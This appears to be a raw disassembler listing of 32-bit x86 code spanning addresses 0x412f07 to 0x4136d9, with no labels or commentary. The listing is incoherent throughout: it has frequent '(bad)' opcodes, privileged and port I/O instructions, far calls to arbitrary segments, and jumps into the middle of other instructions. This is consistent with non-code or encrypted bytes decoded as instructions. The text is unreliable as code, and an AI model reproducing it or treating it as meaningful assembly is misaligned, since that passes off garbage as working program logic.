  412f07:	xor    eax,0x5a87611e
  412f0c:	jge    0x412ebd
  412f0e:	jmp    0x412f58
  412f10:	cli    
  412f11:	je     0x412f48
  412f13:	stos   BYTE PTR es:[edi],al
  412f14:	(bad)  
  412f15:	fcom   QWORD PTR [esi+0x42]
  412f18:	mov    ch,BYTE PTR [ecx]
  412f1a:	jbe    0x412f24
  412f1c:	imul   esi,ebp,0x27
  412f1f:	push   0xffffff8b
  412f21:	js     0x412eaa
  412f23:	lods   al,BYTE PTR ds:[esi]
  412f24:	push   0x4b01a7db
  412f29:	adc    eax,0xea13b606
  412f2e:	adc    eax,0x10258aeb
  412f33:	pop    ds
  412f34:	fcomp  DWORD PTR [eax-0x6cbd1c54]
  412f3a:	call   0xf88c:0x253c3793
  412f41:	aas    
  412f42:	cwde   
  412f43:	jo     0x412f72
  412f45:	dec    ecx
  412f46:	mov    al,BYTE PTR [esi-0x4513a061]
  412f4c:	jno    0x412f5e
  412f4e:	pop    ss
  412f4f:	pop    es
  412f50:	imul   eax,DWORD PTR [ebp-0x4deeaedc],0xce801bc8
  412f5a:	(bad)  
  412f5b:	cli    
  412f5c:	mov    eax,ds:0xcffb74ec
  412f61:	sbb    eax,0xbf4c8c6
  412f66:	inc    ebx
  412f67:	jle    0x412ef8
  412f69:	xchg   edx,eax
  412f6a:	xchg   esp,eax
  412f6b:	push   ebx
  412f6c:	push   ss
  412f6d:	cmp    al,0xef
  412f6f:	cmp    eax,0xe0e75051
  412f74:	mov    gs,WORD PTR [edx-0x23]
  412f77:	push   edx
  412f78:	bnd jmp 0x412f8d
  412f7b:	mov    al,ds:0x9d121543
  412f80:	call   0x803a:0x887df380
  412f87:	iret   
  412f88:	out    dx,eax
  412f89:	stos   DWORD PTR es:[edi],eax
  412f8a:	cdq    
  412f8b:	aad    0xc3
  412f8d:	(bad)  
  412f8e:	int3   
  412f8f:	in     eax,0x33
  412f91:	dec    eax
  412f92:	es loop 0x412f6d
  412f95:	push   ebp
  412f96:	inc    ebp
  412f97:	int    0x47
  412f99:	cmc    
  412f9a:	mov    esi,0x8a36b4d3
  412f9f:	and    al,0xc1
  412fa1:	mov    ch,0xc3
  412fa3:	cmp    eax,0xf3a496d8
  412fa8:	inc    ebx
  412fa9:	lea    ebx,[ebp+0x8e257e9]
  412faf:	in     eax,dx
  412fb0:	inc    ebx
  412fb1:	shl    eax,1
  412fb3:	lea    eax,[esp+ecx*8+0xf]
  412fb7:	push   cs
  412fb8:	push   0xffffffb6
  412fba:	mov    esi,0x52a2d48b
  412fbf:	or     DWORD PTR [ebx+eax*4-0xb],esp
  412fc3:	addr16 jo 0x412f4e
  412fc6:	mov    al,ds:0xf9480ae4
  412fcb:	(bad)  
  412fcc:	sbb    eax,0x7d929091
  412fd1:	mov    bh,0x57
  412fd3:	add    al,BYTE PTR [eax+0x312ab8f5]
  412fd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fda:	into   
  412fdb:	jns    0x413001
  412fdd:	call   0x9a1f:0x6603d133
  412fe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fe5:	mov    BYTE PTR [eax-0x11],ah
  412fe8:	adc    eax,0x28144b1
  412fed:	iret   
  412fee:	out    0x38,al
  412ff0:	xchg   ebx,eax
  412ff1:	outs   dx,BYTE PTR ss:[esi]
  412ff3:	jmp    0x412ffb
  412ff5:	mov    ds:0x85b891a0,eax
  412ffa:	sbb    DWORD PTR [ecx+0x7c0f4fd],esp
  413000:	pusha  
  413001:	retf   
  413002:	je     0x41307c
  413004:	cmp    DWORD PTR ds:0x7966fda8,0xdfa18b27
  41300e:	xor    edi,0xd4bd6786
  413014:	adc    cl,BYTE PTR [eax+0x9]
  413017:	dec    esi
  413018:	adc    ebp,edi
  41301a:	(bad)  
  41301b:	or     esp,DWORD PTR [edi+0x2fbd3e69]
  413021:	or     DWORD PTR [edx+ecx*4-0x4e],edx
  413025:	dec    esi
  413026:	in     eax,0x57
  413028:	(bad)  
  413029:	rol    ebp,cl
  41302b:	mov    al,ds:0x8c0609b9
  413030:	loopne 0x413002
  413032:	push   cs
  413033:	jnp    0x412fc0
  413035:	mov    dh,BYTE PTR [esi+edx*4-0xd]
  413039:	or     BYTE PTR [edi+0x6e],dh
  41303c:	cdq    
  41303d:	mov    DWORD PTR [ecx+0x18],0x3d3c80d5
  413044:	pusha  
  413045:	int    0xc1
  413047:	mov    ah,0x9a
  413049:	rol    ch,0xc8
  41304c:	stos   DWORD PTR es:[edi],eax
  41304d:	jle    0x41301e
  41304f:	xchg   esi,eax
  413050:	loope  0x41300e
  413052:	scas   eax,DWORD PTR es:[edi]
  413053:	mov    edx,esi
  413055:	iret   
  413056:	dec    edi
  413057:	jno    0x41307c
  413059:	ins    BYTE PTR es:[edi],dx
  41305a:	scas   al,BYTE PTR es:[edi]
  41305b:	(bad)  
  41305c:	jge    0x413059
  41305e:	ins    DWORD PTR es:[edi],dx
  41305f:	int3   
  413060:	cwde   
  413061:	and    ebp,ebp
  413063:	scas   al,BYTE PTR es:[edi]
  413064:	mov    ah,0x48
  413066:	adc    bl,BYTE PTR [edi+0x59bb94f6]
  41306c:	fs mov esi,0xdb04a303
  413072:	out    dx,eax
  413073:	f2xm1  
  413075:	inc    ebx
  413076:	push   ds
  413077:	inc    edx
  413078:	sbb    cl,BYTE PTR [ecx+0x3e816ebc]
  41307e:	cmp    eax,DWORD PTR [esi+0x7c8a31f7]
  413084:	sbb    edi,edx
  413086:	jno    0x413031
  413088:	enter  0xb4d7,0x12
  41308c:	fdivp  st(6),st
  41308e:	push   esi
  41308f:	inc    esp
  413090:	push   ecx
  413091:	pop    ds
  413092:	push   eax
  413093:	loopne 0x413109
  413095:	repnz fcom DWORD PTR [eax+0x61]
  413099:	xchg   esi,ebx
  41309b:	and    eax,0x418f0a7c
  4130a0:	mov    bl,0xab
  4130a2:	cmp    bl,BYTE PTR [ecx]
  4130a4:	cmp    ebx,DWORD PTR [ebx-0x21]
  4130a7:	cmp    DWORD PTR [edx],ecx
  4130a9:	mov    BYTE PTR [ebx+0x29706b59],dh
  4130af:	cmp    DWORD PTR [ecx+0x5c],esi
  4130b2:	(bad)  
  4130b3:	retf   0x9de3
  4130b6:	ret    
  4130b7:	ja     0x4130d4
  4130b9:	into   
  4130ba:	add    al,0xcd
  4130bc:	test   al,0x46
  4130be:	adc    cl,ch
  4130c0:	cli    
  4130c1:	in     al,0xa
  4130c3:	xchg   DWORD PTR [ebx],ebp
  4130c5:	jno    0x4130dd
  4130c7:	xlat   BYTE PTR ds:[ebx]
  4130c8:	pop    esi
  4130c9:	xchg   BYTE PTR [edx-0x1f],bl
  4130cc:	scas   eax,DWORD PTR es:[edi]
  4130cd:	repz xchg esi,eax
  4130cf:	dec    esi
  4130d0:	add    al,0xfe
  4130d2:	pushf  
  4130d3:	jo     0x413108
  4130d5:	test   BYTE PTR [esi],cl
  4130d7:	retf   0x78e5
  4130da:	jecxz  0x4130e5
  4130dc:	mov    bh,0xaa
  4130de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130df:	pusha  
  4130e0:	xor    eax,0xf32b46b0
  4130e5:	push   DWORD PTR [edi-0x26]
  4130e8:	adc    eax,0x3df04628
  4130ed:	sbb    al,BYTE PTR [ecx-0x49]
  4130f0:	add    al,0xbc
  4130f2:	and    ah,dl
  4130f4:	cmp    ah,BYTE PTR [edx+0x53]
  4130f7:	stos   BYTE PTR es:[edi],al
  4130f8:	loop   0x413148
  4130fa:	jmp    0x4a510c15
  4130ff:	adc    edx,DWORD PTR [esi+0x23ff552d]
  413105:	pop    ebp
  413106:	ins    DWORD PTR es:[edi],dx
  413107:	mov    al,0xf3
  413109:	clc    
  41310a:	out    0x85,al
  41310c:	pop    edi
  41310d:	aaa    
  41310e:	loopne 0x4130ed
  413110:	ficom  WORD PTR [edi+0x4909fa02]
  413116:	je     0x413105
  413118:	out    dx,eax
  413119:	lods   eax,DWORD PTR ds:[esi]
  41311a:	add    bh,BYTE PTR [ebp+0x5be9cfbf]
  413120:	sub    ebp,DWORD PTR [eax+0x5f]
  413123:	or     BYTE PTR [edi+0x78bb27d6],bl
  413129:	mov    ss,WORD PTR [ebp-0x29]
  41312c:	shr    dh,1
  41312e:	push   cs
  41312f:	fmul   QWORD PTR [edx]
  413131:	(bad)  
  413132:	cli    
  413133:	jo     0x413117
  413135:	pop    esi
  413136:	mov    ss,WORD PTR [edx+0x61]
  413139:	cmp    eax,0x9dd833fb
  41313e:	sbb    edi,DWORD PTR [ecx+0x5555677b]
  413144:	stos   DWORD PTR es:[edi],eax
  413145:	xchg   BYTE PTR [ebx+0xd],ch
  413148:	popf   
  413149:	sbb    ebp,DWORD PTR [edx+ecx*1+0x79]
  41314d:	aas    
  41314e:	cmp    DWORD PTR [ecx+0x5b],ecx
  413151:	jp     0x413169
  413153:	inc    ebp
  413154:	hlt    
  413155:	daa    
  413156:	add    ecx,eax
  413158:	sbb    eax,0xdf608fe9
  41315d:	(bad)  
  41315e:	shl    DWORD PTR [edx+0x5d7e8c02],cl
  413164:	sub    edx,DWORD PTR [eax+edi*8+0x3ac526e]
  41316b:	loop   0x41318e
  41316d:	test   BYTE PTR [ecx+0x24d41ac4],bh
  413173:	xchg   ch,dl
  413175:	sub    ch,BYTE PTR [edi]
  413177:	push   0x7b
  413179:	ror    DWORD PTR [ecx],cl
  41317b:	rcr    DWORD PTR [edx+eax*8],cl
  41317e:	enter  0x6684,0x12
  413182:	dec    eax
  413183:	xor    BYTE PTR [edx*8-0x562fea6b],ch
  41318a:	add    al,BYTE PTR [ebx+0x17929b4d]
  413190:	pop    edx
  413191:	xchg   ebx,eax
  413192:	and    ebp,esi
  413194:	pop    esp
  413195:	mov    WORD PTR [edx+0x7c2099d3],?
  41319b:	bound  ebx,QWORD PTR [edi-0x7c]
  41319e:	xchg   cl,dh
  4131a0:	cli    
  4131a1:	cli    
  4131a2:	mov    edi,0xf6ad4505
  4131a7:	iret   
  4131a8:	dec    ebx
  4131a9:	arpl   si,di
  4131ab:	popf   
  4131ac:	jno    0x4131fa
  4131ae:	sahf   
  4131af:	rcr    BYTE PTR [edx-0x135db365],1
  4131b5:	push   es
  4131b6:	push   ecx
  4131b7:	outs   dx,BYTE PTR ds:[esi]
  4131b8:	and    DWORD PTR [edx+ebp*2-0x8],ebx
  4131bc:	inc    ebp
  4131bd:	rcl    DWORD PTR [esi],1
  4131bf:	jno    0x4131b6
  4131c1:	repnz dec bx
  4131c4:	or     al,0x1d
  4131c6:	mov    ds:0x711b2dc9,eax
  4131cb:	bound  ecx,QWORD PTR [esi]
  4131cd:	fadd   QWORD PTR [ecx+edi*1]
  4131d0:	mov    eax,0x5f745283
  4131d5:	out    dx,al
  4131d6:	mov    eax,cs
  4131d8:	ds jl  0x413246
  4131db:	loope  0x413170
  4131dd:	jns    0x413248
  4131df:	pop    ebp
  4131e0:	add    BYTE PTR [ecx+0x1574ba3b],0x59
  4131e7:	dec    ebx
  4131e8:	dec    edx
  4131e9:	push   esi
  4131ea:	and    BYTE PTR [edx-0x216163b7],al
  4131f0:	into   
  4131f1:	dec    ebp
  4131f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131f3:	fsubr  DWORD PTR [esi]
  4131f5:	push   cs
  4131f6:	aad    0xbf
  4131f8:	sub    BYTE PTR [edx+0x6a],cl
  4131fb:	mov    ch,0xce
  4131fd:	add    DWORD PTR [ecx+0x2b],ebx
  413200:	retf   0x1616
  413203:	and    ebp,DWORD PTR [ecx]
  413205:	fcomp  st(5)
  413207:	push   cs
  413208:	xor    esi,esi
  41320a:	into   
  41320b:	lea    eax,[esi+0x2e25fabe]
  413211:	xchg   edx,eax
  413212:	dec    ecx
  413213:	das    
  413214:	retf   
  413215:	xor    eax,edi
  413217:	or     eax,0xbded9b62
  41321c:	pushf  
  41321d:	push   ds
  41321e:	xor    ebx,DWORD PTR [esi]
  413220:	(bad)  
  413221:	(bad)  
  413222:	(bad)  
  413224:	in     al,0x9b
  413226:	adc    BYTE PTR [esi+0x72],ah
  413229:	dec    edi
  41322a:	jo     0x4131e9
  41322c:	pusha  
  41322d:	inc    edx
  41322e:	sub    DWORD PTR [edi],0xdfaca5fb
  413234:	es aas 
  413236:	aam    0xfe
  413238:	jmp    0x413245
  41323a:	jae    0x41327f
  41323c:	xchg   ebx,eax
  41323d:	jg     0x4132b6
  41323f:	(bad)  
  413240:	lock push esp
  413242:	cmp    DWORD PTR [eax+0xe3b533d],esi
  413248:	(bad)  
  413249:	cdq    
  41324a:	pmullw mm7,QWORD PTR [edi-0x753e4075]
  413251:	mov    edi,0x32c2a9a8
  413256:	pop    es
  413257:	sbb    DWORD PTR [ebp-0x538e6c96],ecx
  41325d:	xor    DWORD PTR [ecx+0x1c],ecx
  413260:	inc    esp
  413261:	push   ebx
  413262:	jmp    0x6e9cefa1
  413267:	sbb    BYTE PTR [ecx],dl
  413269:	and    DWORD PTR [edi],0xffffffe5
  41326c:	fdivr  QWORD PTR [esi-0x4]
  41326f:	sbb    bl,BYTE PTR [esi-0x50]
  413272:	dec    ecx
  413273:	mov    al,ds:0x38aa05c8
  413278:	pushf  
  413279:	cdq    
  41327a:	not    bh
  41327c:	in     eax,dx
  41327d:	int3   
  41327e:	fstp   QWORD PTR [edx]
  413280:	dec    ecx
  413281:	dec    edx
  413282:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413283:	jp     0x413286
  413285:	ds pop esi
  413287:	out    dx,eax
  413288:	jg     0x41324c
  41328a:	xchg   edx,eax
  41328b:	inc    esi
  41328c:	jge    0x413298
  41328e:	dec    esp
  41328f:	sahf   
  413290:	pop    edx
  413291:	fadd   DWORD PTR [esp+eax*2]
  413294:	sti    
  413295:	sbb    eax,0x818bcf1c
  41329a:	xchg   ebp,eax
  41329b:	add    eax,0x3dbe664d
  4132a0:	mov    edi,0x5721bb1b
  4132a5:	aas    
  4132a6:	mov    esi,0x72ebea02
  4132ab:	bound  ecx,QWORD PTR [edx+0x46]
  4132ae:	mov    cl,0xad
  4132b0:	fsub   DWORD PTR [edx+eiz*8+0xb]
  4132b4:	je     0x413240
  4132b6:	int3   
  4132b7:	clc    
  4132b8:	mov    ch,0x24
  4132ba:	repnz repz adc esi,DWORD PTR [edx+0x6e25412c]
  4132c2:	shl    BYTE PTR [edx],1
  4132c4:	or     BYTE PTR [ebx-0x72],ah
  4132c7:	int3   
  4132c8:	jne    0x413323
  4132ca:	push   esi
  4132cb:	ret    0xe6d5
  4132ce:	jge    0x4132bb
  4132d0:	sbb    ah,BYTE PTR [ebx-0x2b]
  4132d3:	jecxz  0x413331
  4132d5:	pop    ecx
  4132d6:	loop   0x4132c2
  4132d8:	(bad)  
  4132d9:	sar    BYTE PTR ds:[edx+0x73],cl
  4132dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132de:	arpl   WORD PTR [eax-0x41622e96],dx
  4132e4:	xor    BYTE PTR ds:0x4b71173c,ah
  4132ea:	(bad)  
  4132eb:	mov    al,ds:0xbe7cfe62
  4132f0:	enter  0xef73,0xbe
  4132f4:	pushf  
  4132f5:	jmp    0x41336a
  4132f7:	out    0x43,eax
  4132f9:	push   ecx
  4132fa:	ds test al,0x71
  4132fd:	pop    edi
  4132fe:	inc    ebx
  4132ff:	lock dec esi
  413301:	and    eax,0x79025784
  413306:	shl    DWORD PTR [eax-0x73215deb],1
  41330c:	loop   0x4132cd
  41330e:	lds    esi,FWORD PTR [ecx+0x33]
  413311:	jl     0x413348
  413313:	push   esi
  413314:	popa   
  413315:	jle    0x413330
  413317:	cmp    bh,BYTE PTR [ebx-0x194f15b3]
  41331d:	fucomp st(7)
  41331f:	fisttp QWORD PTR [edi+edx*1]
  413322:	cli    
  413323:	mov    eax,0x4cc1df13
  413328:	outs   dx,DWORD PTR ds:[esi]
  413329:	jmp    0x98c07b11
  41332e:	jl     0x4132d9
  413330:	xchg   edi,eax
  413331:	dec    edx
  413332:	and    dh,BYTE PTR [esi]
  413334:	jl     0x4132fe
  413336:	or     bl,BYTE PTR [ecx-0x51d708cd]
  41333c:	pop    ss
  41333d:	xor    al,0x2f
  41333f:	push   edx
  413340:	ror    ebx,0xaf
  413343:	idiv   DWORD PTR [ebx-0x785035bf]
  413349:	cmp    DWORD PTR [edi+0x7],ecx
  41334c:	jb     0x413344
  41334e:	fistp  QWORD PTR [ecx+ebp*8-0x24c055fb]
  413355:	stc    
  413356:	outs   dx,BYTE PTR ds:[esi]
  413357:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413358:	icebp  
  413359:	pop    esi
  41335a:	(bad)  
  41335b:	enter  0xa906,0x9a
  41335f:	cmp    bl,dl
  413361:	mov    al,BYTE PTR [edx]
  413363:	js     0x41339f
  413365:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413366:	loope  0x413382
  413368:	push   ebp
  413369:	test   DWORD PTR [eax+ecx*1-0x51],edx
  41336d:	xor    DWORD PTR [ebx-0x44],0xffffff98
  413371:	sub    ebp,esi
  413373:	test   al,0x42
  413375:	imul   eax,DWORD PTR [esi],0xffffffb2
  413378:	mov    ecx,0x4a83c54f
  41337d:	xor    eax,0xba0b1ae9
  413382:	add    BYTE PTR [esi+0x22fcabd4],bl
  413388:	mov    bh,0x34
  41338a:	or     BYTE PTR [esi+0x1b856455],0x55
  413391:	aad    0x1b
  413393:	dec    eax
  413394:	in     al,0xe0
  413396:	(bad)  
  413397:	pop    esi
  413398:	icebp  
  413399:	in     eax,0xf9
  41339b:	addr16 push 0xffffff80
  41339e:	pushw  ss
  4133a0:	and    DWORD PTR [eax],0xffffffc0
  4133a3:	cmp    al,0xe9
  4133a5:	out    dx,al
  4133a6:	pand   mm4,mm2
  4133a9:	and    DWORD PTR [edx+0x5b63528b],esp
  4133af:	daa    
  4133b0:	enter  0x1753,0x4f
  4133b4:	and    DWORD PTR ds:0xbab935d3,eax
  4133ba:	jp     0x413381
  4133bc:	stc    
  4133bd:	adc    al,0x89
  4133bf:	push   edx
  4133c0:	sbb    dl,dh
  4133c2:	cmp    dh,BYTE PTR [esi+esi*2]
  4133c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133c6:	imul   ebx,DWORD PTR [eax+0x278eb78b],0xffffffcb
  4133cd:	sub    al,0x62
  4133cf:	js     0x413419
  4133d1:	sar    DWORD PTR [esi+eax*1],cl
  4133d4:	or     eax,0xc66c57dc
  4133d9:	pop    ds
  4133da:	(bad)  
  4133dc:	inc    ebp
  4133dd:	pushf  
  4133de:	add    edi,DWORD PTR [ebp+0x62]
  4133e1:	pop    edi
  4133e2:	dec    edi
  4133e3:	inc    edx
  4133e4:	aad    0x1c
  4133e6:	dec    eax
  4133e7:	nop
  4133e8:	es add al,0x1c
  4133eb:	mov    esp,0x6e3bb8d4
  4133f0:	pop    ebp
  4133f1:	rol    DWORD PTR [edx],cl
  4133f3:	aaa    
  4133f4:	mov    edi,0x64f62820
  4133f9:	push   edi
  4133fa:	push   esi
  4133fb:	stos   DWORD PTR es:[edi],eax
  4133fc:	sahf   
  4133fd:	push   cs
  4133fe:	and    eax,0xd3054a7
  413403:	push   es
  413404:	inc    esi
  413405:	cs ror ebx,0x8b
  413409:	retf   
  41340a:	push   0xffffffca
  41340c:	(bad)  
  41340e:	pop    eax
  41340f:	loope  0x413449
  413411:	(bad)  
  413412:	call   0x80ba:0x45010e6b
  413419:	lock xor ecx,DWORD PTR [edi-0x5e]
  41341d:	cwde   
  41341e:	loop   0x413496
  413420:	aam    0xc8
  413422:	bound  ebx,QWORD PTR [ecx+edi*1+0x3e]
  413426:	fidiv  WORD PTR [esi+ebp*1+0x6d]
  41342a:	sahf   
  41342b:	adc    al,0xa4
  41342d:	outs   dx,DWORD PTR ds:[esi]
  41342e:	adc    DWORD PTR [edi-0x44eba56f],esp
  413434:	aaa    
  413435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413436:	ror    DWORD PTR [esi+0x1b],cl
  413439:	sub    edi,DWORD PTR [ebx-0x7e]
  41343c:	inc    edi
  41343d:	add    BYTE PTR [eax+eiz*2-0x3adee05b],cl
  413444:	cmp    esi,DWORD PTR [ecx]
  413446:	lahf   
  413447:	out    0xa7,al
  413449:	popf   
  41344a:	dec    esi
  41344b:	jo     0x41344a
  41344d:	enter  0xebab,0xab
  413451:	and    ebx,DWORD PTR [esi-0x78]
  413454:	rcl    BYTE PTR [ebx],cl
  413456:	mov    bl,0x42
  413458:	cli    
  413459:	pop    edx
  41345a:	jno    0x41349c
  41345c:	mov    bh,ah
  41345e:	adc    dl,cl
  413460:	inc    DWORD PTR [edx+0x54]
  413463:	iret   
  413464:	fwait
  413465:	icebp  
  413466:	sbb    al,0x5f
  413468:	nop
  413469:	cmc    
  41346a:	pop    eax
  41346b:	jg     0x413477
  41346d:	(bad)  
  41346e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41346f:	or     dh,dl
  413471:	aad    0xad
  413473:	sbb    eax,0xa346a4e0
  413478:	cmp    eax,0x4c048cee
  41347d:	cmp    edx,eax
  41347f:	jp     0x41346e
  413481:	outs   dx,DWORD PTR ds:[esi]
  413482:	sti    
  413483:	jmp    0x4134ea
  413485:	xor    BYTE PTR ds:0x71f7b806,al
  41348b:	mov    dh,0xd6
  41348d:	jle    0x413442
  41348f:	cmp    al,0xdd
  413491:	cmp    DWORD PTR [esi-0x4dd16729],eax
  413497:	push   0x8ab62e38
  41349c:	or     eax,DWORD PTR [esi]
  41349e:	js     0x413484
  4134a0:	imul   esi,DWORD PTR [ecx],0xe
  4134a3:	data16 shr ch,1
  4134a6:	dec    esp
  4134a7:	sub    ah,BYTE PTR ds:0xe1b92a95
  4134ad:	ds into 
  4134af:	repnz aas 
  4134b1:	jge    0x41347b
  4134b3:	mov    eax,ds:0xe1ada213
  4134b8:	push   ss
  4134b9:	inc    edx
  4134ba:	adc    eax,ebp
  4134bc:	aaa    
  4134bd:	jmp    0x668ab81c
  4134c2:	mov    ebp,0x3e9276ad
  4134c7:	icebp  
  4134c8:	jmp    0xb453:0xa73ab8ff
  4134cf:	js     0x413481
  4134d1:	mov    al,ds:0x13cdba21
  4134d6:	imul   ebx,DWORD PTR [ecx],0x7a
  4134d9:	ss je  0x413492
  4134dc:	cld    
  4134dd:	repnz pop eax
  4134df:	cmp    dh,BYTE PTR [ebx-0x4c]
  4134e2:	hlt    
  4134e3:	xchg   ebp,eax
  4134e4:	les    esp,FWORD PTR [esp+esi*4-0x4e65c424]
  4134eb:	das    
  4134ec:	cld    
  4134ed:	aad    0xd0
  4134ef:	call   0x327643dc
  4134f4:	mov    ah,0x64
  4134f6:	adc    eax,0xd167fcbf
  4134fb:	sbb    DWORD PTR ds:0xeb35c21b,edx
  413501:	not    DWORD PTR [ecx]
  413503:	hlt    
  413504:	ficom  DWORD PTR [edi+0x7b]
  413507:	in     al,0xf7
  413509:	push   cs
  41350a:	mov    esp,0x30ad46ac
  41350f:	cmc    
  413510:	ds addr16 mov al,0xdb
  413514:	(bad)  
  413515:	mov    cl,0xbb
  413517:	dec    ebx
  413518:	data16 test BYTE PTR [edi],ch
  41351b:	xchg   ebx,eax
  41351c:	jecxz  0x413582
  41351e:	sahf   
  41351f:	jp     0x41351c
  413521:	xchg   esi,eax
  413522:	js     0x4134e0
  413524:	mov    dh,0x31
  413526:	push   ebp
  413527:	mov    WORD PTR [edi+0x5edb663c],?
  41352d:	mov    bh,BYTE PTR [ebx+0x44]
  413530:	daa    
  413531:	lock shl DWORD PTR [ebp-0x6b63c448],cl
  413538:	repz pop ss
  41353a:	mov    bh,0xb3
  41353c:	mov    dh,0x12
  41353e:	stos   DWORD PTR es:[edi],eax
  41353f:	jbe    0x4135ad
  413541:	xchg   ebp,eax
  413542:	mov    eax,0x5625a3ce
  413547:	cld    
  413548:	cdq    
  413549:	sub    eax,0x8777005b
  41354e:	sub    eax,eax
  413550:	fstp   QWORD PTR [esi]
  413552:	mov    ch,0x4d
  413554:	sub    ch,BYTE PTR [esi+0x5de5aa06]
  41355a:	es test eax,0xa2fc7cd9
  413560:	ret    
  413561:	push   edx
  413562:	lds    ebx,FWORD PTR [ebx+0x48]
  413565:	sbb    esp,DWORD PTR ds:[ebp+0x50]
  413569:	mov    DWORD PTR [ebx+0x59],ecx
  41356c:	out    0xe8,eax
  41356e:	pop    edx
  41356f:	das    
  413570:	xchg   edi,eax
  413571:	sbb    BYTE PTR [eax-0x1e],dl
  413574:	popa   
  413575:	mov    ?,WORD PTR [ebx]
  413577:	pop    esp
  413578:	out    dx,eax
  413579:	mov    edi,0x310c5bb
  41357e:	in     al,dx
  41357f:	sub    BYTE PTR [eax-0x43],al
  413582:	in     al,dx
  413583:	and    dl,dl
  413585:	mov    esi,0x676f7c71
  41358a:	sbb    edi,ecx
  41358c:	mov    eax,0x36007a72
  413591:	nop
  413592:	je     0x41359d
  413594:	popf   
  413595:	mov    BYTE PTR [esi+0x44],bl
  413598:	or     al,0x1c
  41359a:	js     0x413556
  41359c:	stos   DWORD PTR es:[edi],eax
  41359d:	jl     0x4135db
  41359f:	shl    eax,1
  4135a1:	iret   
  4135a2:	jmp    0xb4e8:0xb2edf877
  4135a9:	cmp    eax,0x7c22c4ae
  4135ae:	jmp    0xcaf7:0xe14327d3
  4135b5:	mov    al,0x1e
  4135b7:	sbb    DWORD PTR [edi+0x1eb93d18],ebp
  4135bd:	test   DWORD PTR [ecx+0x1e],eax
  4135c0:	sbb    DWORD PTR [edi+0x33119c64],ebx
  4135c6:	pop    eax
  4135c7:	sub    al,0x92
  4135c9:	fstp   DWORD PTR [ebx]
  4135cb:	sub    eax,0x4bdf28e7
  4135d0:	rdmsr  
  4135d2:	xor    ecx,DWORD PTR [ecx+0x7073e901]
  4135d8:	mov    bl,BYTE PTR [edx+ecx*2-0x20]
  4135dc:	cs inc edx
  4135de:	mov    bh,0xb9
  4135e0:	mov    ds:0x835c3a9c,al
  4135e5:	pop    ds
  4135e6:	repnz sbb BYTE PTR [ebx],0x8d
  4135ea:	xchg   esi,eax
  4135eb:	pop    ebp
  4135ec:	mov    eax,ds:0xdc35e440
  4135f1:	dec    edx
  4135f2:	xchg   ecx,eax
  4135f3:	mov    cl,0xb2
  4135f5:	or     DWORD PTR [edi-0x3b1d3469],edx
  4135fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135fc:	xor    al,dl
  4135fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135ff:	mov    esi,0xee18b8e5
  413604:	in     al,0x22
  413606:	repnz movs DWORD PTR es:[edi],DWORD PTR cs:[esi]
  413609:	push   esp
  41360a:	add    ebx,DWORD PTR [edx-0x47]
  41360d:	and    al,0x1d
  41360f:	mov    bl,0x6f
  413611:	pop    es
  413612:	jno    0x41361c
  413614:	mov    ah,ah
  413616:	inc    esi
  413617:	jo     0x4135b6
  413619:	loope  0x4135b5
  41361b:	xchg   esi,eax
  41361c:	jle    0x413619
  41361e:	add    ch,BYTE PTR [ecx-0x7cf1487]
  413624:	aaa    
  413625:	xchg   ebx,eax
  413626:	aam    0x33
  413628:	pop    esi
  413629:	fs mov dh,0xbe
  41362c:	mov    eax,ds:0x7410eea
  413631:	mov    ebx,0xe5ccf9f0
  413636:	out    dx,eax
  413637:	mov    DWORD PTR [eax-0x3c52859c],esp
  41363d:	repnz or DWORD PTR [ecx],eax
  413640:	mov    al,0x26
  413642:	jno    0x41360e
  413644:	mov    bl,0x21
  413646:	adc    DWORD PTR [ebx+0x4],ebp
  413649:	jno    0x413657
  41364b:	ins    BYTE PTR es:[edi],dx
  41364c:	pop    es
  41364d:	xchg   DWORD PTR [edi],esp
  41364f:	dec    edi
  413650:	into   
  413651:	cmp    BYTE PTR [ecx+0x36],ch
  413654:	sub    eax,DWORD PTR [ebx+0x40]
  413657:	pop    eax
  413658:	inc    ecx
  413659:	std    
  41365a:	mov    esi,0xc4eb0de7
  41365f:	push   ebp
  413660:	lds    edi,FWORD PTR [edx-0xd]
  413663:	das    
  413664:	retf   
  413665:	jl     0x4136e5
  413667:	mov    eax,ds:0xc2eac1a1
  41366c:	loopne 0x4135f2
  41366e:	int    0x19
  413670:	adc    edi,DWORD PTR [eax-0x15a525b1]
  413676:	and    BYTE PTR [ecx],0xf4
  413679:	leave  
  41367a:	mov    bh,0x87
  41367c:	cmp    eax,0x440bc43
  413681:	iret   
  413682:	xchg   ebx,eax
  413683:	arpl   WORD PTR [edx-0x1c0f4fb1],bp
  413689:	ffree  st(5)
  41368b:	int    0xd5
  41368d:	retf   0xaa49
  413690:	push   es
  413691:	push   es
  413692:	mov    ebx,DWORD PTR [edi-0x37d6a51c]
  413698:	mov    ecx,0x38fff919
  41369d:	sbb    esi,eax
  41369f:	ins    BYTE PTR es:[edi],dx
  4136a0:	mov    ds:0x2ba41c3e,al
  4136a5:	or     ebp,DWORD PTR [ebp+0x23]
  4136a8:	inc    eax
  4136a9:	xchg   esi,eax
  4136aa:	pop    esp
  4136ab:	fcmovnu st,st(5)
  4136ad:	cmp    ebp,eax
  4136af:	adc    eax,0x1a3a76d9
  4136b4:	fwait
  4136b5:	mov    ch,0xe1
  4136b7:	adc    al,BYTE PTR [ebp-0x556614f2]
  4136bd:	push   0x64b6c341
  4136c2:	test   BYTE PTR [esi-0x33],cl
  4136c5:	cmp    DWORD PTR [ebx],0x34
  4136c8:	and    BYTE PTR [esi-0x12b8679d],ah
  4136ce:	test   eax,0x72fe8706
  4136d3:	push   0x3
  4136d5:	test   BYTE PTR [eax-0x5c],ch
  4136d8:	clc    
  4136d9:	fbld   TBYTE PTR [ecx+ecx*2+0x48356f94]
